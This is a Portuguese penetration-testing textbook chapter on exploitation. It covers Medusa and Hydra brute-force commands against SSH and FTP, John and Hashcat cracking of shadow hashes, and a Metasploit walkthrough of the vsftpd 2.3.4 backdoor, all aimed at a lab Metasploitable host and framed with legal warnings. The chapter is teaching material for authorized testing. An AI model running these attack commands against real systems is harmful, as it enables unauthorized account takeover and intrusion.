# Capítulo 9 — Fases de Exploração e Ferramentas Práticas

> Os três pontos entregaram o mapa: IPs, serviços versionados, falhas
> priorizadas. A exploração é o momento em que uma hipótese ("esta credencial é
> fraca", "este serviço tem backdoor") vira fato comprovado — um acesso. Este
> capítulo mostra o fluxo e as ferramentas, sempre no laboratório do Capítulo 5 e
> sempre com a disciplina de quem documenta cada passo.

> ⚠️ **Atenção (leia antes de começar):** Tudo aqui é executado **apenas** contra
> alvos que você possui ou foi autorizado a testar. Os comandos deste capítulo,
> apontados para um sistema de terceiros sem a carta de autorização do Capítulo
> 2, são crime. O alvo de todos os exemplos é o Metasploitable do seu laboratório
> isolado.

## 9.1 Do mapeamento ao exploit: as fases

A exploração não é um salto; é uma sequência:

1. **Seleção do vetor.** Da lista priorizada (Capítulo 8), escolha o caminho de
   menor resistência que leva ao objetivo. Credencial fraca costuma vencer
   *exploit* complexo.
2. **Preparação.** Entenda o *exploit*/técnica, prepare o *payload*, defina o que
   "sucesso" significa (um *shell*? um login? leitura de um arquivo?).
3. **Execução controlada.** Dispare uma vez, observe. Nada de metralhar.
4. **Verificação.** Confirme o acesso obtido e seu nível (usuário comum? root?).
5. **Captura de evidência.** Um *print*, o *hash* de um arquivo-prova, a saída do
   comando — matéria-prima do relatório (Capítulo 10).

O objetivo do pentest **não** é "causar o máximo de estrago"; é **provar o risco**
com a menor perturbação possível. Essa mentalidade é o que diferencia o
profissional do vândalo.

## 9.2 Ataques à autenticação: o vetor mais rentável

Credenciais fracas são, ano após ano, uma das principais portas de entrada reais.
Por isso ataques a senha (contra SSH, FTP, painéis web, bancos) são centrais —
tanto por eficácia quanto por serem fáceis de *demonstrar* para o cliente.

Tipos de ataque a senha:

| Tipo | Como funciona | Quando usar |
|---|---|---|
| **Força bruta pura** | Testa todas as combinações | Senhas curtas; inviável para senhas longas |
| **Dicionário (*wordlist*)** | Testa uma lista de senhas prováveis | O mais usado; rápido contra senhas comuns |
| **Híbrido** | Dicionário + mutações (`senha` → `senha123`, `S3nh@`) | Contra políticas de senha previsíveis |
| ***Credential stuffing*** | Reaproveita credenciais vazadas | Quando há bases de vazamento aplicáveis |
| **Offline (quebra de *hash*)** | Ataca o *hash* capturado, sem tocar o serviço | Após obter o *hash* (ex.: `/etc/shadow`) |

> 💡 **Dica Técnica:** Prefira ataques **online** (contra o serviço vivo) apenas
> para demonstrar senhas fracas óbvias e sob controle de taxa — eles são lentos,
> barulhentos e podem bloquear contas. Quando possível, capture o *hash* e ataque
> **offline** com `john` ou `hashcat`, que são ordens de magnitude mais rápidos e
> não tocam o alvo.

## 9.3 Quebra de senhas online com Medusa

O **Medusa** é um força-bruta de login paralelo e modular, que fala vários
protocolos (SSH, FTP, HTTP, SMB, MySQL, etc.). Sua forma geral:

```bash
$ medusa -h <alvo> -u <usuario> -P <wordlist> -M <modulo> [opções]
```

As opções essenciais:

| Flag | Significado |
|---|---|
| `-h` | Host alvo (`-H` para arquivo com vários hosts) |
| `-u` | Usuário único (`-U` para arquivo de usuários) |
| `-p` | Senha única (`-P` para arquivo de senhas / *wordlist*) |
| `-M` | Módulo do protocolo (`ssh`, `ftp`, `http`, ...) |
| `-t` | Número de *threads* paralelas (tarefas simultâneas) |
| `-f` | Para no primeiro par válido encontrado |
| `-n` | Porta não-padrão |

### Exemplo 1 — SSH contra o laboratório

```bash
# Usuario conhecido 'msfadmin', testando senhas de uma wordlist, via SSH.
# -f para no primeiro acerto; -t 4 usa 4 threads (moderado, para nao travar).
$ medusa -h 192.168.56.20 -u msfadmin -P /usr/share/wordlists/rockyou.txt \
         -M ssh -f -t 4
```

Saída de sucesso (ilustrativa):

```text
ACCOUNT FOUND: [ssh] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

### Exemplo 2 — FTP com lista de usuários e de senhas

```bash
# -U lista de usuarios, -P lista de senhas, modulo ftp.
$ medusa -h 192.168.56.20 -U usuarios.txt -P senhas.txt -M ftp -t 3 -f
```

### Exemplo 3 — descobrir primeiro se o FTP aceita anônimo (vulnerab. implícita)

Antes de forçar bruta, teste o óbvio — login anônimo é comum e dispensa qualquer
ataque:

```bash
$ nmap -p 21 --script ftp-anon 192.168.56.20
# Se retornar "Anonymous FTP login allowed", nem precisa de forca bruta.
```

> ⚠️ **Atenção:** `-t` alto (muitas *threads*) acelera, mas pode (a) travar o
> serviço, (b) disparar bloqueio de conta/IP, (c) estourar seu limite de janela.
> Comece baixo. E lembre: muitos serviços têm *rate limiting* e *lockout* — num
> alvo real, força bruta descontrolada pode causar indisponibilidade (possível
> crime/violação de contrato) e ainda queimar seu acesso.

### Hydra como alternativa

O **Hydra** faz o mesmo papel do Medusa com sintaxe similar; vale conhecer os dois
porque um módulo às vezes funciona melhor que o outro:

```bash
$ hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4 -f
```

## 9.4 Quebra de senhas offline: John e Hashcat

Quando você obtém *hashes* (por exemplo, após ler `/etc/shadow` num sistema já
comprometido), ataque-os offline:

```bash
# John the Ripper: modo automatico contra um arquivo de hashes
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
$ john --show hashes.txt       # mostra o que ja foi quebrado

# Hashcat: usa GPU, rapidissimo. -m define o tipo de hash, -a o modo de ataque.
# Exemplo: -m 1800 = sha512crypt (Linux), -a 0 = ataque de dicionario.
$ hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

A vantagem é decisiva: offline não há *rate limit*, não há *lockout*, não há
rastro no serviço — e a GPU testa bilhões de candidatos. É por isso que **vazamento
de *hash* é tão grave quanto vazamento de senha** quando o *hash* é fraco (daí a
importância de algoritmos lentos e *salt*, do lado defensivo).

## 9.5 Frameworks de exploração: o Metasploit

Para vulnerabilidades explícitas, o **Metasploit Framework** é a plataforma
dominante. Ele padroniza o ciclo "escolher *exploit* → configurar → escolher
*payload* → disparar → obter sessão", com centenas de módulos prontos.

Vocabulário essencial:

| Termo | O que é |
|---|---|
| **Exploit** | O módulo que abusa de uma falha específica |
| **Payload** | O código que roda no alvo após o sucesso (ex.: um *shell*) |
| **Meterpreter** | *Payload* avançado da Metasploit, com muitos recursos de pós-exploração |
| **Module options** | Parâmetros (`RHOSTS` = alvo, `LHOST` = você, `LPORT` = sua porta) |
| **Session** | A conexão ativa com um alvo comprometido |

Fluxo típico no `msfconsole` (contra o laboratório):

```bash
$ msfconsole                          # abre o framework

msf6 > search vsftpd 2.3.4            # procura modulo para a falha do Cap. 8
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(...) > show options      # ve o que precisa configurar
msf6 exploit(...) > set RHOSTS 192.168.56.20
msf6 exploit(...) > run               # dispara
# Em caso de sucesso, abre uma sessao de comando no alvo.
```

> 💡 **Dica Técnica:** O Metasploit é poderoso e perigosamente fácil — é a
> ferramenta que mais produz *script kiddies*. Use-o entendendo cada módulo:
> `info <modulo>` mostra a descrição, os alvos e as referências (inclusive o
> CVE). Saber *por que* o `vsftpd_234_backdoor` funciona (a versão 2.3.4 teve seu
> código-fonte adulterado para abrir um *shell* quando o usuário continha um
> *smiley* `:)`) é o que transforma o clique em conhecimento.

## 9.6 Automação com responsabilidade

Automação é inevitável em escala — mas automação cega é o oposto do método. Um
*script* que encadeia descoberta → varredura → tentativa de login é legítimo
*desde que* opere só no escopo e com controles de taxa. Um exemplo de automação
*defensável* é o que apenas **reúne e organiza** achados para análise humana:

```bash
#!/usr/bin/env bash
# recon_lab.sh — descoberta + varredura organizadas, SO EM LABORATORIO.
# Nao explora nada; apenas coleta para analise humana posterior.
set -euo pipefail
FAIXA="192.168.56.0/24"
SAIDA="recon_$(date +%F_%H%M)"
mkdir -p "$SAIDA"

echo "[*] Descobrindo hosts vivos..."
nmap -sn "$FAIXA" -oG "$SAIDA/hosts.gnmap"
grep "Up" "$SAIDA/hosts.gnmap" | awk '{print $2}' > "$SAIDA/alvos.txt"

echo "[*] Varrendo servicos/versoes dos alvos..."
while read -r ip; do
  sudo nmap -sS -sV -O -oA "$SAIDA/scan_$ip" "$ip"
done < "$SAIDA/alvos.txt"

echo "[*] Pronto. Resultados em $SAIDA/ para analise."
```

Note o que esse *script* **não** faz: não dispara *exploit*, não força senha, não
toma decisão de ataque. Ele prepara o terreno para o julgamento humano. Essa é a
fronteira sadia da automação ofensiva — e ela antecipa um tema da Parte V: na
defesa autônoma de IA (Capítulo 15), a mesma pergunta reaparece — *o que a máquina
pode decidir sozinha e o que exige um humano no circuito?*

---

### Resumo do capítulo
- A exploração segue fases: selecionar vetor → preparar → executar controlado → verificar → capturar evidência; o objetivo é **provar o risco**, não causar estrago.
- Ataques a autenticação são o vetor mais rentável; prefira capturar *hash* e atacar **offline** quando possível.
- Medusa (e Hydra) fazem força bruta online modular; controle `-t` para não travar o alvo nem estourar a janela.
- John e Hashcat quebram *hashes* offline — sem *rate limit*, com GPU; por isso *hash* fraco é tão grave quanto senha.
- Metasploit padroniza a exploração de falhas explícitas (exploit + payload + sessão); use com `info`/`show options`, não como clique mágico.

### Para fixar
1. Teste `nmap --script ftp-anon` antes de qualquer força bruta no laboratório — o acesso mais fácil muitas vezes dispensa ataque.
2. Rode o Medusa contra o SSH do Metasploitable com `-t` baixo e `-f`, e capture a linha `ACCOUNT FOUND` como evidência.
3. No `msfconsole`, use `info` no módulo do vsftpd e explique, em duas frases, *por que* a falha existe.
